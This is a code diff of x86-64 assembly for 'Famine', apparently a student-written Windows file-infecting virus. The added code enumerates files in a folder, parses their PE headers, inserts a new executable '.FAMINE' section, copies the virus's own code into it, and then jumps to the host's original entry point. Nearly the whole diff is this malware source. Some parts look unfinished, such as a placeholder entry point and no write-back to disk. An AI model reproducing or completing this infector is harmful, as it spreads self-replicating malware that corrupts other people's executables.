@@ -6,13 +6,11 @@
 ;-----------------------------------
 
 includelib libcmt.lib
-includelib libvcruntime.lib
 includelib kernel32.lib
 
 extrn puts:proc
-extrn exit:proc
-extrn _open:proc
 extrn printf:proc
+
 extrn FindFirstFileA:proc
 extrn FindNextFileA:proc
 extrn memset:proc
@@ -20,18 +18,145 @@ extrn strncat:proc
 extrn strncpy:proc
 extrn ReadFile:proc
 extrn CreateFileA:proc
-extrn print_last_error:proc
+extrn memcpy:proc
+extrn malloc:proc
+extrn GetFileSize:proc
 
 .code
 label_debut:
+MUST_EXIT db 0
 db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
-
-hello db 'Hello 64-bit world!',0ah,0
-print_decimal db 'open : %d',0ah,0
-print_ptr db 'ptr : %p',0ah,0
-print_ok_handle db 'Found good file : handle = %d and filename = [%s]',0ah,0h
 TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
 TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
+SECTION_NAME db '.FAMINE',0
+ENTRY_POINT db 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
+
+; rbp
+; 56 - 64	: padding
+; 48 - 56	: nbr of bytes read 
+; 40 - 48	: malloc
+; 32 - 40	: params
+; 00 - 32	: shadow
+; rsp
+
+; r12 : handle
+; r13 : fileSize
+; r14 : taille de notre code
+; 
+
+handle_file proc ; int handle
+	push rbp
+	mov rbp, rsp
+	sub rsp, 64
+
+	mov r12, rcx
+	mov rcx, r12
+	mov rdx, 0 
+	call GetFileSize
+
+	mov r13, rax ; r13 = taille du fichier
+
+	mov rcx, label_fin
+	mov rdx, label_debut
+	sub rcx, rdx
+
+	mov r14, rcx
+	
+	add rcx, rax 
+	call malloc
+
+	test rax, rax
+	je ret_failure
+
+	mov [rsp + 40], rax
+	mov word ptr [rax], 5a4dh
+
+	add rax, 2
+	sub r13, 2
+
+	mov rcx, r12
+	mov rdx, rax
+	mov r8, r13
+	lea r9, [rsp + 48]
+	mov qword ptr [rsp + 32], 0
+	call ReadFile
+
+	test rax, rax
+	je ret_failure
+
+	test r13, qword ptr [rsp+48]
+	je ret_failure
+
+	mov rax, qword ptr [rsp + 40]
+	add rax, 3Ch
+	xor rdx, rdx
+	mov edx, dword ptr [rax] ; on saute le MS DOS header 
+	mov r12, rdx
+
+	mov rax, qword ptr [rsp + 40]
+	add rax, r12
+	add rax, 6
+	mov cx, word ptr [rax] ; cx = OldNumberOfSections
+	inc word ptr [rax] ; NumberOfSections++
+	add rax, 14
+
+	xor rbx, rbx
+	mov bx, word ptr [rax]
+	add rax, rbx
+	add rax, 4 ;  ptr += SizeOfOptionaHeaders + 4
+
+	xor rbx, rbx
+	mov bx, cx
+	mov rdx, rbx
+
+		mov rbx, rax ; temp
+
+	mov rax, 40
+	imul rdx
+	add rax, rbx
+
+	mov rbx, qword ptr [SECTION_NAME]
+	mov  [rax], rbx ; on met le nom de la section
+
+	add rax, 8
+	mov dword ptr [rax], r14d ; on met la taille de Famine
+
+	add rax, 4
+	mov rbx, rax
+	sub rbx, 40
+	mov r8d, dword ptr [rbx]
+	mov r9d, dword ptr [rbx - 4]
+	add r8d, r9d
+	or r8d, 0fffh
+	inc r8d
+	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle
+
+	add rax, 4
+	add r13, 2
+	mov dword ptr [rax], r13d ; Emplacement du code = taille du fichier
+
+	add rax, 4
+	mov qword ptr [rax], 0  ; PointerToReliocations and PointerToLineNumber
+
+	add rax, 8
+	mov dword ptr [rax], 0 ; NUmberOfRelocations and NumberOfLineNumber
+
+	add rax, 4
+	mov dword ptr [rax], 60000020h ; Characterisitcs
+
+
+	mov rcx, [rsp + 40]
+	add rcx, r13
+	lea rdx, label_debut
+	mov r8, r14
+	call memcpy
+	
+
+ret_failure:
+	mov rsp, rbp
+	pop rbp
+	ret
+handle_file endp
 
 
 ; rbp
@@ -78,8 +203,6 @@ open_file proc ; char *file_path - return fd or 0
 	lea r9, [rsp + 66]
 	mov rax, 0
 	mov [rsp + 32], rax ; Open only if exists
-	mov rax, 0
-	mov [rsp + 36], rax ; flag normal
 	call ReadFile
 
 	mov ax, word ptr [rsp + 64]
@@ -88,7 +211,6 @@ open_file proc ; char *file_path - return fd or 0
 
 ret_error:
 	mov r12, -1
-	call print_last_error
 ret_ok:
 	mov rax, r12
 	mov rsp, rbp
@@ -143,10 +265,8 @@ loop_start:
 		cmp rax, -1
 		je loop_start
 
-		lea rcx, print_ok_handle
-		mov rdx, rax
-		lea r8, [rsp + 400]
-		call printf
+		mov rcx, rax 
+		call handle_file
 
 		jmp loop_start
 loop_end:
@@ -164,6 +284,25 @@ infect_folder endp
 ; rsp 
 
 main proc
+
+
+		push RAX
+		push RBX
+		push RCX
+		push RDX
+		push RSI
+		push RDI
+		push R8 
+		push R9 
+		push R10
+		push R11
+		push R12
+		push R13
+		push R14
+		push R15
+		push RSP
+		push RBP
+
 		push rbp
 		mov rbp, rsp
 		sub	rsp, 48
@@ -175,32 +314,46 @@ main proc
 		mov rcx, label_debut
 		call puts
 
-		mov rcx, [rsp + 32]
-		mov rdx, 8000h
-		mov	r8, 0
-		call _open
-
-		lea rcx, print_decimal
-		mov rdx, rax
-		call printf
-
-		lea rcx, print_ptr
-		mov rdx, label_debut
-		call printf
-
 		lea rcx, TMP_1
 		call infect_folder
 
 		mov rdx, label_fin
 		mov rcx, label_debut
 		sub rdx, rcx
-		lea rcx, print_ptr
-		call printf
+;		lea rcx, print_ptr
+;		call printf
+
 
 		xor rax, rax
 		mov rsp, rbp
 		pop rbp
+
+		pop RBP
+		pop RSP
+		pop R15
+		pop R14
+		pop R13
+		pop R12
+		pop R11
+		pop R10
+		pop R9 
+		pop R8 
+		pop RDI
+		pop RSI
+		pop RDX
+		pop RCX
+		pop RBX
+		pop RAX
+		
+		test BYTE ptr [MUST_EXIT], 1
+		jne stop
+
+		jmp qword ptr [ENTRY_POINT]
+
+stop:
+		xor rax, rax
 		ret
+
 main endp
 
 label_fin:
